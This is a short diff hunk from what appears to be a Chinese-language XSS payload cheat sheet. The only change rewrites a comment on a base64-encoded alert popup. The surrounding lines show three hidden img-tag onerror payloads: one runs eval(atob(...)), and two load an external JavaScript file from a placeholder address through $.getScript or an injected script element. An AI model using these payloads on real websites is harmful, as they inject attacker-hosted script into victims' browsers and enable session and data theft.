@@ -35,7 +35,7 @@
 
   ```
   ##// <img/style=display:none src=# onerror=eval(atob('YWxlcnQoJzEyMycp'))>
-  注：YWxlcnQoJzEyMycp => alert('123')
+  注：YWxlcnQoJzEyMycp => 弹窗123
   ##// <img/src=# style=display:none onerror=$.getScript("js地址")>
   ##// <img/src=# style=display:none onerror=createElement('script');body.appendChild(s);s.src='js地址'>
   ```
